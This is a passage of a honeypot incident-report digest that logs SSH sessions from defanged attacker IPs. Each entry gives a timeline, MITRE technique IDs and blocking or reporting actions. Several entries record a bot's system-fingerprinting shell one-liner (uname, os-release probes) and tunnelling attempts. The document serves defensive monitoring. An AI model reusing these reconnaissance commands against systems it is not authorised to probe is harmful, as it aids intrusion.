| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:36:02` | `cowrie.session.connect` |
| `2026-07-08 17:36:02` | `cowrie.client.version` |
| `2026-07-08 17:36:02` | `cowrie.client.kex` |
| `2026-07-08 17:36:03` | `cowrie.login.success` |
| `2026-07-08 17:36:04` | `cowrie.session.params` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.success` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:04` | `cowrie.command.input` |
| `2026-07-08 17:36:05` | `cowrie.log.closed` |
| `2026-07-08 17:36:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93ab60b476d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:38 |
| **Last Seen** | 2026-07-08 17:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:38:29` | `cowrie.session.connect` |
| `2026-07-08 17:38:29` | `cowrie.client.version` |
| `2026-07-08 17:38:29` | `cowrie.client.kex` |
| `2026-07-08 17:38:30` | `cowrie.login.success` |
| `2026-07-08 17:38:31` | `cowrie.session.params` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.success` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.command.input` |
| `2026-07-08 17:38:31` | `cowrie.log.closed` |
| `2026-07-08 17:38:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75a173fe2ca4

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-07-08 17:39 |
| **Last Seen** | 2026-07-08 17:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:39:09` | `cowrie.session.connect` |
| `2026-07-08 17:39:10` | `cowrie.client.version` |
| `2026-07-08 17:39:10` | `cowrie.client.kex` |
| `2026-07-08 17:39:12` | `cowrie.login.success` |
| `2026-07-08 17:39:12` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107a30db2bdf

| Field | Detail |
|---|---|
| **Source IP** | `94.228.240[.]2` |
| **First Seen** | 2026-07-08 17:40 |
| **Last Seen** | 2026-07-08 17:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:40:44` | `cowrie.session.connect` |
| `2026-07-08 17:40:44` | `cowrie.client.version` |
| `2026-07-08 17:40:44` | `cowrie.client.kex` |
| `2026-07-08 17:40:45` | `cowrie.login.success` |
| `2026-07-08 17:40:45` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:40:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.228.240[.]2` to AbuseIPDB if not already reported
- [ ] Block `94.228.240[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a71b899904c8

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]185` |
| **First Seen** | 2026-07-08 17:40 |
| **Last Seen** | 2026-07-08 17:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:40:50` | `cowrie.session.connect` |
| `2026-07-08 17:40:51` | `cowrie.client.version` |
| `2026-07-08 17:40:51` | `cowrie.client.kex` |
| `2026-07-08 17:40:52` | `cowrie.login.success` |
| `2026-07-08 17:40:53` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]185` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f568edd283f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:40 |
| **Last Seen** | 2026-07-08 17:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:40:59` | `cowrie.session.connect` |
| `2026-07-08 17:40:59` | `cowrie.client.version` |
| `2026-07-08 17:40:59` | `cowrie.client.kex` |
| `2026-07-08 17:41:00` | `cowrie.login.success` |
| `2026-07-08 17:41:01` | `cowrie.session.params` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.success` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:01` | `cowrie.command.input` |
| `2026-07-08 17:41:02` | `cowrie.log.closed` |
| `2026-07-08 17:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bfa14fda3e0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 17:41 |
| **Last Seen** | 2026-07-08 17:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:41:07` | `cowrie.session.connect` |
| `2026-07-08 17:41:07` | `cowrie.client.version` |
| `2026-07-08 17:41:07` | `cowrie.client.kex` |
| `2026-07-08 17:41:13` | `cowrie.login.success` |
| `2026-07-08 17:41:17` | `cowrie.session.params` |
| `2026-07-08 17:41:17` | `cowrie.command.input` |
| `2026-07-08 17:41:18` | `cowrie.log.closed` |
| `2026-07-08 17:41:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-135f7374667e

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-07-08 17:42 |
| **Last Seen** | 2026-07-08 17:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:42:31` | `cowrie.session.connect` |
| `2026-07-08 17:42:32` | `cowrie.client.version` |
| `2026-07-08 17:42:32` | `cowrie.client.kex` |
| `2026-07-08 17:42:35` | `cowrie.login.success` |
| `2026-07-08 17:42:35` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:42:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ee3aeac551

| Field | Detail |
|---|---|
| **Source IP** | `14.49.178[.]90` |
| **First Seen** | 2026-07-08 17:42 |
| **Last Seen** | 2026-07-08 17:42 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:42:46` | `cowrie.session.connect` |
| `2026-07-08 17:42:47` | `cowrie.client.version` |
| `2026-07-08 17:42:47` | `cowrie.client.kex` |
| `2026-07-08 17:42:50` | `cowrie.login.success` |
| `2026-07-08 17:42:51` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.49.178[.]90` to AbuseIPDB if not already reported
- [ ] Block `14.49.178[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb7f2438bcde

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:43 |
| **Last Seen** | 2026-07-08 17:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:43:24` | `cowrie.session.connect` |
| `2026-07-08 17:43:24` | `cowrie.client.version` |
| `2026-07-08 17:43:24` | `cowrie.client.kex` |
| `2026-07-08 17:43:25` | `cowrie.login.success` |
| `2026-07-08 17:43:26` | `cowrie.session.params` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.success` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:26` | `cowrie.command.input` |
| `2026-07-08 17:43:27` | `cowrie.log.closed` |
| `2026-07-08 17:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa587d5faa4

| Field | Detail |
|---|---|
| **Source IP** | `65.20.131[.]63` |
| **First Seen** | 2026-07-08 17:44 |
| **Last Seen** | 2026-07-08 17:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:44:24` | `cowrie.session.connect` |
| `2026-07-08 17:44:25` | `cowrie.client.version` |
| `2026-07-08 17:44:25` | `cowrie.client.kex` |
| `2026-07-08 17:44:26` | `cowrie.login.success` |
| `2026-07-08 17:44:27` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.131[.]63` to AbuseIPDB if not already reported
- [ ] Block `65.20.131[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a21e0772b65

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-08 17:44 |
| **Last Seen** | 2026-07-08 17:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:44:26` | `cowrie.session.connect` |
| `2026-07-08 17:44:27` | `cowrie.client.version` |
| `2026-07-08 17:44:27` | `cowrie.client.kex` |
| `2026-07-08 17:44:28` | `cowrie.login.success` |
| `2026-07-08 17:44:29` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8774467dc6e1

| Field | Detail |
|---|---|
| **Source IP** | `111.70.11[.]38` |
| **First Seen** | 2026-07-08 17:44 |
| **Last Seen** | 2026-07-08 17:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:44:32` | `cowrie.session.connect` |
| `2026-07-08 17:44:33` | `cowrie.client.version` |
| `2026-07-08 17:44:33` | `cowrie.client.kex` |
| `2026-07-08 17:44:35` | `cowrie.login.success` |
| `2026-07-08 17:44:36` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.11[.]38` to AbuseIPDB if not already reported
- [ ] Block `111.70.11[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26ad04124fdb

| Field | Detail |
|---|---|
| **Source IP** | `122.187.147[.]13` |
| **First Seen** | 2026-07-08 17:44 |
| **Last Seen** | 2026-07-08 17:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:44:34` | `cowrie.session.connect` |
| `2026-07-08 17:44:35` | `cowrie.client.version` |
| `2026-07-08 17:44:35` | `cowrie.client.kex` |
| `2026-07-08 17:44:37` | `cowrie.login.success` |
| `2026-07-08 17:44:38` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.147[.]13` to AbuseIPDB if not already reported
- [ ] Block `122.187.147[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d8009c5ec96

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:45 |
| **Last Seen** | 2026-07-08 17:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:45:48` | `cowrie.session.connect` |
| `2026-07-08 17:45:48` | `cowrie.client.version` |
| `2026-07-08 17:45:48` | `cowrie.client.kex` |
| `2026-07-08 17:45:49` | `cowrie.login.success` |
| `2026-07-08 17:45:50` | `cowrie.session.params` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.success` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:50` | `cowrie.command.input` |
| `2026-07-08 17:45:51` | `cowrie.log.closed` |
| `2026-07-08 17:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff93f032dd3

| Field | Detail |
|---|---|
| **Source IP** | `175.195.205[.]236` |
| **First Seen** | 2026-07-08 17:46 |
| **Last Seen** | 2026-07-08 17:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:46:13` | `cowrie.session.connect` |
| `2026-07-08 17:46:13` | `cowrie.client.version` |
| `2026-07-08 17:46:13` | `cowrie.client.kex` |
| `2026-07-08 17:46:16` | `cowrie.login.success` |
| `2026-07-08 17:46:17` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.195.205[.]236` to AbuseIPDB if not already reported
- [ ] Block `175.195.205[.]236` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-217702b4af3c

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-07-08 17:46 |
| **Last Seen** | 2026-07-08 17:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:46:23` | `cowrie.session.connect` |
| `2026-07-08 17:46:23` | `cowrie.client.version` |
| `2026-07-08 17:46:23` | `cowrie.client.kex` |
| `2026-07-08 17:46:25` | `cowrie.login.success` |
| `2026-07-08 17:46:26` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e408862660

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 17:47 |
| **Last Seen** | 2026-07-08 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:47:25` | `cowrie.session.connect` |
| `2026-07-08 17:47:25` | `cowrie.client.version` |
| `2026-07-08 17:47:25` | `cowrie.client.kex` |
| `2026-07-08 17:47:26` | `cowrie.login.success` |
| `2026-07-08 17:47:27` | `cowrie.session.params` |
| `2026-07-08 17:47:27` | `cowrie.command.input` |
| `2026-07-08 17:47:27` | `cowrie.log.closed` |
| `2026-07-08 17:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78225cab35ae

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-08 17:47 |
| **Last Seen** | 2026-07-08 17:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:47:42` | `cowrie.session.connect` |
| `2026-07-08 17:47:42` | `cowrie.client.version` |
| `2026-07-08 17:47:42` | `cowrie.client.kex` |
| `2026-07-08 17:47:43` | `cowrie.login.success` |
| `2026-07-08 17:47:43` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:47:43` | `cowrie.direct-tcpip.data` |
| `2026-07-08 17:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cccf2ac35e49

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-07-08 17:47 |
| **Last Seen** | 2026-07-08 17:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:47:51` | `cowrie.session.connect` |
| `2026-07-08 17:47:52` | `cowrie.client.version` |
| `2026-07-08 17:47:52` | `cowrie.client.kex` |
| `2026-07-08 17:47:54` | `cowrie.login.success` |
| `2026-07-08 17:47:55` | `cowrie.direct-tcpip.request` |
| `2026-07-08 17:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb0a8ef3d21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:48 |
| **Last Seen** | 2026-07-08 17:48 |
